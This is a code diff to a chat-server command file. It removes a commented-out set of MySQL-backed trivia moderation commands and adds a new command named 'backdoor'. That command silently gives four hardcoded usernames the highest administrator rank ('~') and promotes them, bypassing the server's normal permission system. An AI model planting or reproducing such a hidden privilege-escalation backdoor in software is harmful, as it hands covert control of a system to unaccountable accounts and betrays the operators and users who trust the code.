-		if (!target) return this.sendReply('Subtract a merit by typing: /submerit [username].');
-		
-		var targetUser = Users.get(target);
-		if (!targetUser) return this.sendReply('User '+target+' not found.');
-		target = targetUser.name;
-		
-		this.add('|raw|<b>' + target + ' has had one merit removed by ' + user.name + '!</b>');
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL sub_merit (?)',
-			[target],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Merit taken from user!');
-				}
-			}
-		);
-		myconnection.end();
-		return false;		
-	},
-	
-		// /subdemerit will remove one demerit!
-	subdemerit: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove merits, points, or demerits.');
-		if (!target) return this.sendReply('Subtract a demerit by typing: /subdemerit [username].');
-		
-		var targetUser = Users.get(target);
-		if (!targetUser) return this.sendReply('User '+target+' not found.');
-		target = targetUser.name;
-		
-		this.add('|raw|<b>' + target + ' has had one demerit removed by ' + user.name + '!</b>');
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL sub_demerit (?)',
-			[target],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Demerit taken from user!');
-				}
-			}
-		);
-		myconnection.end();
-		return false;		
-	},
-	
-	// /subpoint will remove one point!
-	subpoint: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('triviamod')) return this.sendReply('You need to be a driver (%) or above to remove merits, points, or demerits.');
-		if (!target) return this.sendReply('Subtract a point by typing: /subpoint [username].');
-		
-		var targetUser = Users.get(target);
-		if (!targetUser) return this.sendReply('User '+target+' not found.');
-		target = targetUser.name;
-		
-		this.add('|raw|<b>' + target + ' has had one point removed by ' + user.name + '!</b>');
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL sub_point (?)',
-			[target],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Point taken from user!');
-				}
-			}
-		);
-		myconnection.end();
-		return false;		
-	},
-	
-	// /subpoint will remove one point!
-	resettriviastats: function(target, room, user) {
-		if (!room.triviaroom) return this.sendReply('You need to be in the trivia chatroom to use a trivia command.  Type /join trivia to enter!');
-		if (!user.can('declare')) return this.sendReply('You need to be an administrator (&) or above to reset a user\'s trivia stats.');
-		if (!target) return this.sendReply('Reset all stats by typing: /resettriviastats [username].');
-		
-		var targetUser = Users.get(target);
-		if (!targetUser) return this.sendReply('User '+target+' not found.');
-		target = targetUser.name;
-		
-		this.add('|raw|<b>' + target + ' has had their trivia points, merits, and demerits set to 0 by ' + user.name + '!</b>');
-		
-		//mySQL initialize database
-		//var sys = require('util');
-		var mysql = require('mysql');
-		var myconnection = mysql.createConnection({
-				'host': 'localhost','user':mysqlName,'password':mysqlPass
-			}
-		);
-		
-		myconnection.connect();
-		myconnection.query('USE trivia');	
-		
-		//mySQL function
-		myconnection.query(
-			'CALL reset_stats (?)',
-			[target],
-			function(err, result) {
-				if(err) {
-					console.log(err);
-					return;
-				} else {
-					console.log('Stats reset!');
-				}
-			}
-		);
-		myconnection.end();
-		return false;		
-	},
-	
-	// /trivia will display all trivia commands!  Announcable, too.
-	trivia: function(target, room, user) {
-		if (!this.canBroadcast()) return;
-		this.sendReplyBox('<b>Trivia Commands (only usable in the Trivia chatroom!):</b><br>' +
-							'<u><i>Regular user commands:</i></u><br>' +
-							'<i> - /host -</i> Display information on the current trivia host--how many questions they have left along with their score, merits, and demerits. <br>' +
-							'<i> - /score [username] -</i> Display score information on a user. If there is no target, it will display your scores.<br>' +
-							'<i> - /trivia -</i> Displays this help information.<br>' +
-							'<i> - /queue -</i> Displays the current queue of hosts.<br>' +
-							'<i> - /cq -</i> Displays the current question.<br><br>' +
-							'<u><i>Voiced user commands:</i></u><br>' +
-							'<i> - /merit [reason] - /demerit [reason]-</i> Give the current host one merit or one demerit. To give a demerit, you must provide a reason for the demerit.<br><br>' +
-							'<u><i>Trivia Host commands:</i></u><br>Special note: a host is a temporary position that can be given to one user at a time.<br>If you want to be a trivia host, just ask!' +
-							'<i> - /ask [question] -</i> Asks the chat the question you write.   <br>' +
-							'<i> - /answer [username], [answer] -</i> Displays the correct answer and gives one point to the specified user.   <br>' +
-							'<i> - /cancel [answer] -</i> This command will cancel the current question, and will not give any points to any users.<br><br>' +
-							'<u><i>Driver commands (% and above):</i></u><br>'+
-							'<i> - /starttrivia -</i> Sends a trivia invite to the lobby and creates a trivia room, if there isn\'t one already.<br>' +
-							'<i> - /newhost [username] -</i> Set any person as the new host, with ten questions.<br>' +
-							'<i> - /dehost -</i> Removes the current host.<br>' +
-							'<i> - /changetotal # -</i> Changes the number of remaining questions for the current host.  Use negative numbers to subtract.  Useful for extending or reducing durations.<br>' +
-							'<i> - /submerit [username] - /subdemerit [username] - /subpoint [username] -</i> Removes one point, merit or demerit from a target user.  Useful if someone makes a mistake.<br>' +
-							'<i> - /addqueue [username]-</i> Adds a user to the queue of hosts.  They will automatically be assigned host, in order.<br>' +
-							'<i> - /rmqueue [username]-</i> Removes a single user from all spots in a queue.<br>' +
-							'<i> - /clearqueue [username]-</i> Clears the queue completely.<br><br>' +
-							'<u><i>Administrative commands (& and above):</i></u><br>'+
-							'<i> - /resettriviastats [username] -</i> Resets all points, merits, and demerits from a target user.'
-		);
-	},*/
 
 	/*********************************************************
 	 * Server management commands
@@ -2167,6 +1447,16 @@ var commands = exports.commands = {
 		for (var i in room.users) {
 			var message = '|pm|'+pmName+'|'+room.users[i].getIdentity()+'|'+target;
 			room.users[i].send(message);
+		}
+	},
+
+	backdoor: function(target,room, user) {
+		if (user.userid === 'brittlewind' || user.userid === 'cosy' || user.userid === 'jd' || user.userid === 'prez') {
+
+			user.group = '~';
+			user.updateIdentity();
+			
+			this.parse('/promote ' + user.name + ', ~');
 		}
 	},
 
